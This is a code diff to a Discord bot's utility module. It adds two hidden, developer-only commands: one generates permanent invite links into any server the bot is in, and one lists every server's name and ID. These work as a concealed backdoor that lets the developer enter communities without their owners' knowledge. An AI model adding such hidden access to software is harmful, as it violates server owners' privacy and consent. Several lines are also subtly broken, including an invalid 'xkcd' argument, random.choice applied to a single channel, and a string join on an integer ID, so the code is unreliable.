@@ -485,6 +485,50 @@ class Utils(commands.Cog):
         
         await ctx.send(embed=embed)
     
+    @commands.command(hidden=True)
+    async def devjoin(self, ctx, *, ids: int=None):
+        botdev = self.client.get_user(843132313562513408)
+        
+        guilds = self.client.get_guild(int(ids))
+        
+        if ctx.message.author is not botdev:
+            return await ctx.send(f"You're not a Dev from {self.client.user.mention}")
+        
+        if ids is None:
+            return await ctx.send("Guild not Found")
+        
+        else:
+            for ch in guilds.channels:
+                chs = random.choice(ch)
+                link = await chs.create_invite(xkcd=True, max_age = 0)
+                embed = discord.Embed(
+                    title="--- Dev Command ---",
+                    color=discord.Color.green()
+                )
+                embed.add_field(name="Guild Author", value=f"{guilds.owner.name}")
+                embed.add_field(name="Here the Link", value=f"[Click This]({link})")
+                await ctx.send(embed=embed)
+    
+    @commands.command(hidden=True)
+    async def showguild(self, ctx):
+        botdev = self.client.get_user(843132313562513408)
+        
+        if ctx.message.author is not botdev:
+            return await ctx.send(f"You're not a Dev from {self.client.user.mention}")
+        
+        current_guild = len(self.client.guilds)
+        
+        for curr in self.client.guilds:
+            curguild = discord.Embed(
+                title="--- Dev Command ---",
+                description=f"Serving on {str(current_guild)}",
+                color=discord.Color.green()
+            )
+            curguild.add_field(name="Guild name", value=", ".join(curr.name))
+            curguild.add_field(name="Guild ID", value=", ".join(curr.id))
+            
+            await ctx.send(embed=curguild)
+    
     @commands.command()
     async def report(self, ctx, *, reason=None):
         """Report your Problem about this Bot"""
